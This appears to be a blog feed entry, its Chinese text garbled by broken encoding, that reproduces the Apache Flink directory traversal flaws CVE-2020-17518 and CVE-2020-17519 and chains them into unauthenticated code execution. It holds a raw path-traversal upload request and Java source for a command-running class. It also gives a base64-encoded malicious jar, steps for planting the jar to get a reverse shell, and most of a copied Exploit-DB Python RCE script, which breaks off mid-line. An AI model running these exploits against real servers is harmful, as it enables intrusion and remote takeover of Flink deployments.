    <content type="html"><![CDATA[<h1 id="æ¼æ´èƒŒæ™¯"><a href="#æ¼æ´èƒŒæ™¯" class="headerlink" title="æ¼æ´èƒŒæ™¯"></a>æ¼æ´èƒŒæ™¯</h1><p>2021å¹´01æœˆ06æ—¥ï¼ŒApache Flink<code>å‘å¸ƒäº†</code>Apache Flink ç›®å½•ç©¿è¶Šæ¼æ´,ç›®å½•ç©¿è¶Šæ¼æ´<code>çš„é£é™©é€šå‘Šï¼Œæ¼æ´ç¼–å·ä¸º</code>CVE-2020-17518,CVE-2020-17519<code>ï¼Œæ¼æ´ç­‰çº§ï¼š</code>é«˜å±ï¼Œæ¼æ´è¯„åˆ†ï¼š8.5</p><p>è¿œç¨‹æ”»å‡»è€…é€šè¿‡<code>REST API</code>ç›®å½•éå†ï¼Œå¯é€ æˆ<code>æ–‡ä»¶è¯»å–/å†™å…¥</code>çš„å½±å“ã€‚</p><h3 id="CVE-2020-17518-æ–‡ä»¶å†™å…¥æ¼æ´"><a href="#CVE-2020-17518-æ–‡ä»¶å†™å…¥æ¼æ´" class="headerlink" title="CVE-2020-17518: æ–‡ä»¶å†™å…¥æ¼æ´"></a>CVE-2020-17518: æ–‡ä»¶å†™å…¥æ¼æ´</h3><p>æ”»å‡»è€…åˆ©ç”¨<code>REST API</code>ï¼Œå¯ä»¥ä¿®æ”¹<code>HTTP</code>å¤´ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶å†™å…¥åˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„ä½ç½®ï¼ˆ<code>Flink 1.5.1</code>è¿›ç¨‹èƒ½è®¿é—®åˆ°çš„ï¼‰ã€‚</p><h3 id="CVE-2020-17519-æ–‡ä»¶è¯»å–æ¼æ´"><a href="#CVE-2020-17519-æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="CVE-2020-17519: æ–‡ä»¶è¯»å–æ¼æ´"></a>CVE-2020-17519: æ–‡ä»¶è¯»å–æ¼æ´</h3><p>Apache Flink 1.11.0 å…è®¸æ”»å‡»è€…é€šè¿‡<code>JobManager</code>è¿›ç¨‹çš„<code>REST API</code>è¯»å–<code>JobManager</code>æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»ä½•æ–‡ä»¶ï¼ˆ<code>JobManager</code>è¿›ç¨‹èƒ½è®¿é—®åˆ°çš„ï¼‰ ã€‚</p><h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><h3 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h3><p>â€“<code>Apache:Apache Flink</code>: 1.11.0, 1.11.1, 1.11.2</p><h3 id="CVE-2020-17519-1"><a href="#CVE-2020-17519-1" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h3><p>â€“<code>Apache:Apache Flink</code>: 1.5.1 â€“ 1.11.2</p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="CVE-2020-17518-ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"><a href="#CVE-2020-17518-ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´" class="headerlink" title="CVE-2020-17518 ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"></a>CVE-2020-17518 ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</h2><p>éªŒè¯POCï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: x.x.x.x:8081</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;x.x.x.x:8081&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: jNj0_2132_ulastactivity&#x3D;94cd6XUujZO6Ir8Y402Py8R2hRo4k9SYYId68%2Bsj5Hj9wct3lwDn; jNj0_2132_lastcheckfeed&#x3D;1%7C1603631734</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 185</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;success&quot;</span><br><span class="line"></span><br><span class="line">success</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194912.png"></p><h2 id="é…åˆApache-Flink-1-9-x-File-Upload-RCE-Unauthenticated-éƒ¨ç½²jaråŒ…æ¥GetShell"><a href="#é…åˆApache-Flink-1-9-x-File-Upload-RCE-Unauthenticated-éƒ¨ç½²jaråŒ…æ¥GetShell" class="headerlink" title="é…åˆApache Flink 1.9.x - File Upload RCE (Unauthenticated) éƒ¨ç½²jaråŒ…æ¥GetShell"></a>é…åˆApache Flink 1.9.x - File Upload RCE (Unauthenticated) éƒ¨ç½²jaråŒ…æ¥GetShell</h2><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>Flink 1.9.x ç‰ˆæœ¬</li><li>å”¯ä¸€ä¼˜ç‚¹ï¼šç›¸æ¯”ç›´æ¥ä¸Šä¼ jaråŒ…ï¼Œæœ‰äº†éšè”½æ€§ã€‚</li></ul><blockquote><p>å‚è€ƒæ–‡ç« ä¸­ï¼Œç›´æ¥ä¸Šä¼ jspï¼Œwebç›®å½•ä¸‹ä¸è§£æï¼Œä¼šä½œä¸ºæ–‡ä»¶ä¸‹è½½ã€‚</p></blockquote><h3 id="å‡†å¤‡JaråŒ…"><a href="#å‡†å¤‡JaråŒ…" class="headerlink" title="å‡†å¤‡JaråŒ…"></a>å‡†å¤‡JaråŒ…</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Execute</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String o = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        String cmd = args[<span class="number">0</span>];</span><br><span class="line">        ProcessBuilder p;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            p = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String pty = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">new</span> File(<span class="string">&quot;/bin/bash&quot;</span>)).exists()) &#123;</span><br><span class="line">                pty = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;pty, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Process s = p.start();</span><br><span class="line">        Scanner c = (<span class="keyword">new</span> Scanner(s.getInputStream())).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†æºç è¿›è¡Œç¼–è¯‘å¹¶æ‰“åŒ…ä¸ºjaråŒ…ï¼Œ</p><p>Base64ä¹‹åçš„jaråŒ…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UEsDBBQAAAAIAASBJlLHe4y+9gIAAOgEAAANAAAARXhlY3V0ZS5jbGFzc21Uy1bUQBC9zTwSQnhFBEZ8gAoOCIwiKgKivEWGhwbRATaZ0AcCMwkmPQIbN&#x2F;oTfIFrNoNHjn6Av+MatToqLycn6UpX3Vt1q7uT7z+&#x2F;fAPQixUNTehQcVtFp4YudGsoR0rFHWnvKuhRcE9Fr4r7GlQ8UPFQQZ+KRxqq0C+HARWDMvRYwZCGJ3iqoQ7DKkakHZXDmIJxBRMM8UHHdcQQQyTZvsgQHfVWOUN12nH5bCGf5f6Clc1xCuQtx2WoTy6nN6x3VipnuWspU&#x2F;iOuzYgiZWmsOzNGWsrxJNABZOklEEb37H5lnA8N1DwjOamV&#x2F;BtPuHIrPr4DrcLgnfLnDou4woDGBQv6HatPKWZ0vEc0zrSmCGJ246rYxZzDI0nIuZ9z+ZBMFJwcqvcZ6g5r4&#x2F;y2fnVbr5DBctStizTQr5U1nFTwTqJCAmOl&#x2F;qjqTwMZK1gXSLndbzASyJ2EdHEAkNtCC8IJ5cybct1ua&#x2F;glY5FvJb4NwRdGdaRwZKOZdmP8rfHM8rmshvcFgwXSiwneU98x6t3trHdQPA8Q8UaF9T&#x2F;FvfFLkNbssTelMpfIby0t839USsgWXXJkiDV9lxBmx4wNJ1OPLpu+SZ&#x2F;W+CuzQfalxguJksfiTjfcQIRyKMlYbFAWL4g+Em5k92jerXnncSsov6m3K2CoLTcooYbiPxvu04FiN6YLBUIheiFgI&#x2F;xnJN3hDwgt0ou03+7Sjljds4LOFpwiT5IeZWByUNK41WatZBlZGMdB2D7kCf3Go0awciJKOL0vTYTrCyE&#x2F;6B5nOxHoyzdEemZMSKfES0iZsSLUPbQfAg1E&#x2F;+K8kzE0MxM1KgwM7FO8wD67Cf0GpX90UNUZYzqA9QUUbsHxagm1zEnEZUc45jTVcQFGa&#x2F;LJKjIxQPUGw1FNPbHErEiEvuymVBtD3QayxEh3Qq9N6CSfkHV6EMNJlGLafpbcPJuohHvkcAHWozrxGhF5Ai9Cm7QfYR6kPlF4aiCm&#x2F;Qa3q0Ea6MnClp0epJh0fbfUEsDBAoAAAgAACJ1bU8AAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALgAAAFBLAQI&#x2F;ABQAAAAIAASBJlLHe4y+9gIAAOgEAAANACQAAAAAAAAAIAAAAAAAAABFeGVjdXRlLmNsYXNzCgAgAAAAAAABABgAsQeXEAPk1gFyshItA+TWAdyLEi0D5NYBUEsBAgoACgAACAAAInVtTwAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAIQMAAE1FVEEtSU5GL1BLAQIUABQACAgIACJ1bU+Iigi&#x2F;MAAAAC4AAAAUAAQAAAAAAAAAAAAAAEgDAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSwUGAAAAAAMAAwDcAAAAvgMAAAAA</span><br></pre></td></tr></table></figure><p>linkè¿è¡Œæ—¶æ–‡ä»¶éƒ½åœ¨/tmpç›®å½•ä¸‹ï¼Œè·¯å¾„ç±»ä¼¼äº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;flink-web-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#x2F;</span><br></pre></td></tr></table></figure><p>æ¯å°æœåŠ¡å™¨è¿è¡ŒFlinkæ—¶è·¯å¾„éƒ½ä¸åŒï¼Œå› æ­¤è¦å…ˆè·å–è¯¥è·¯å¾„ã€‚</p><p>é€šè¿‡æ¥å£<code> /jobmanager/config</code> åˆ™å¯ä»¥è·å–<code>web.tmpdir</code>çš„è·¯å¾„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194913.png"></p><p>æˆ‘è¿™é‡Œä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;flink-web-2dc398da-fb29-4250-b9ef-68afe0dd08ab</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ jaråŒ…åˆ°<code>/tmp/flink-web-2dc398da-fb29-4250-b9ef-68afe0dd08ab/flink-web-upload/</code>ç›®å½•ä¸‹ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194914.png"></p><p>æ‰§è¡Œå‘½ä»¤ï¼Œåå¼¹shellã€‚</p><p>æˆ‘æ‰‹åŠ¨å¤ç°äº†ä¸‰æ¬¡éƒ½æ²¡æˆåŠŸï¼Œç”¨expdbé‡Œçš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Apache Flink 1.9.x - File Upload RCE (Unauthenticated)</span></span><br><span class="line"><span class="comment"># Google Dork: None</span></span><br><span class="line"><span class="comment"># Date: 2020.11.01</span></span><br><span class="line"><span class="comment"># Exploit Author: bigger.wing</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://flink.apache.org/</span></span><br><span class="line"><span class="comment"># Software Link: https://flink.apache.org/downloads.html</span></span><br><span class="line"><span class="comment"># Version: 1.9.x</span></span><br><span class="line"><span class="comment"># Tested on: Centos7.x, 1.9.1</span></span><br><span class="line"><span class="comment"># CVE: None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlinkRCECheck</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.timeout = <span class="number">10</span></span><br><span class="line">        self.upload_file = <span class="string">&#x27;rce_check_from_sec.jar&#x27;</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                          <span class="string">&#x27;Chrome/61.0 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_version</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">&#x27;%s/%s&#x27;</span> % (self.url, <span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url, headers=self.headers, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            version = res.json().get(<span class="string">&#x27;flink-version&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            version = <span class="string">&#x27;unknown&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> version</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jar_check</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">&#x27;%s/%s&#x27;</span> % (self.url, <span class="string">&#x27;jars&#x27;</span>)</span><br><span class="line">        jar_list = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url, headers=self.headers, verify=<span class="literal">False</span>, timeout=self.timeout)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;application/json&#x27;</span> <span class="keyword">in</span> res.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">                res = res.json()</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> res[<span class="string">&#x27;files&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">if</span> file[<span class="string">&#x27;id&#x27;</span>].endswith(self.upload_file):</span><br><span class="line">                        jar_list.append(file[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jar_list</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jar_upload</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">&#x27;%s/%s&#x27;</span> % (self.url, <span class="string">&#x27;jars/upload&#x27;</span>)</span><br><span class="line">        jar_content = base64.b64decode(<span class="string">&#x27;UEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALg&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AAAFBLAwQKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAE1FVEEtSU5GL1BLAwQUAAgICAAidW1PAAA&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AAAAAAAAAAAAADQAAAEV4ZWN1dGUuY2xhc3ONVet2E1UU/k4yyUwmQy+TQlsQBdSStqSxiIotIlAK&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;VkJbSa0G8DKZHpPTJjNhLjTVCvoQ/ugT8MsfqCtx0aUPwEOx3Gdo09KGtUzW7H3O3vvbt7PPzPMXz&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;/4FMIlfdbyDyxo+1XBFx1Vc05HCjIbrks+quKHipobPNMzp0PC5hlsqChpu6+jBvCQLGhal6gsVd3&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;QUsaRjAF9qWJb8K0m+lqQkyd0URbin4r6OkzLoN5J/K8l3Or6HpaKswmZIXhKOCC4zxLOjywzKjLv&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;CGXoLwuHzYb3MvSWrXCOJWXBtq7ZseULud4RKUBU+Q6ow2+R2GPBpEtUt4TAcy94rrFoPrXzNcir5&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;YuAJpzItA7AGw/F9qkXPtbnvXwtFbYV75CDeCDZkuENo8m15FQqX6eKaHLuEtesrtJI2h0NIG7ujC&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;QNRyxdty3GiqPps0+aNQLiOr4J86EU39Gx+Q8gyjZ3yJiTSwLsYYQCD6voTjlXnKriBH1AxUIWgJN&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;aFY2AVawxDr6uToe9gCeSPsp/gTQoYy9syTI5k+bJw8n6VkogAws2/zCkVKcqWX5WWNQN1UNtjOQK&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;6oB73H6pSxQMDHnxpH5Dp/asGQjw0sA7KtwlhYAMjBn7ETwyDB9PrJB7fvLJpYBM/G3gEoeKxgV9Q&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;o0x3mvRKaQvlVW5TsMyeqNPoV3uw4Qe8zpCu8IBa1eCenIKRbJch6nb46cAtuOvcm7F8SmAg29VIs&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;10noOmk8Tix3/FM1fKK/EHIHZtPj95lONotLM1ukjeFH/jRXSGzhB9YXiDNR7tOW/8hIUMP1TfnNM&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;KA3HKLCh7cBdPJ7lMQfCjbVSETMUKfX+c1UReBPJKzr2/TgTFXq5Y/z5uUtOJELGHXXNmyuBvKSjo&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;RF8nJXipJq9HgDl2L3P86kL3LrAXu7nRnurim+A25w2m8Te9G+YvRxaILRvQs7fLE6a4hMdYGexqp&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;s0STkZBhlKjx0gBjGCeewjnkyIrAbInskiT7y4wVxuLnb5vxv6G0kDCTLahbOLUNrZT8B6lS3NSLJ&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;cVMF0uJc8U2jPknuGAemVK20VMye9voa6F/C6rZK0W7mGFFYswOJtdCRuoHSsMU5Ggbx8zBFoamEs&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;OJFoa3kJb8+BMo4wW5OvEH3tjGyVIbb5pvtXBqnJ5o0cLpFs7s1fohjhCN01+BSvUMEr1AdV6Ejpt&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;I4xbpOXqxhj66kP34DSb+RCbqzR36WEwScoIaGSdEDu/RXpE9wXm8H/l9St4m5dsMv+MDWsXI28IO&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;Yg1zFP8jQjwifhEfU5+nCKWQ/TQ9l6IsP/kPUEsHCEEOnKXWAwAA4gYAAFBLAQIUABQACAgIACJ1b&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;U+Iigi/MAAAAC4AAAAUAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSw&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;ECCgAKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAB2AAAATUVUQS1JTkYvUEsBAhQ&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AFAAICAgAInVtT0EOnKXWAwAA4gYAAA0AAAAAAAAAAAAAAAAAnQAAAEV4ZWN1dGUuY2xhc3NQSwUG&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AAAAAAMAAwC4AAAArgQAAAAA&#x27;</span>)</span><br><span class="line">        files = &#123;<span class="string">&#x27;jarfile&#x27;</span>: (self.upload_file, io.BytesIO(jar_content), <span class="string">&#x27;application/octet-stream&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url, headers=self.headers, files=files, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            file_id = res.json()[<span class="string">&#x27;filename&#x27;</span>].split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">return</span> file_id</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="comment"># delete history jar packages</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jar_delete</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> jar_name <span class="keyword">in</span> self.jar_check:</span><br><span class="line">            url = <span class="string">&#x27;%s//jars/%s&#x27;</span> % (self.url, jar_name)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.delete(url=url, headers=self.headers, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rce</span>(<span class="params">self, command</span>):</span></span><br><span class="line">        jar_file = self.jar_upload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            execute_cmd_url = <span class="string">&#x27;%s/jars/%s/run?entry-class=Execute&amp;program-args=&quot;%s&quot;&#x27;</span> % (self.url, jar_file, command)</span><br><span class="line">            res = requests.post(url=execute_cmd_url, headers=self.headers, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            res = re.findall(<span class="string">&#x27;\|@\|(.*?)\|@\|&#x27;</span>, res.text)[<span class="number">0</span>][<span class="number">0</span>:<span 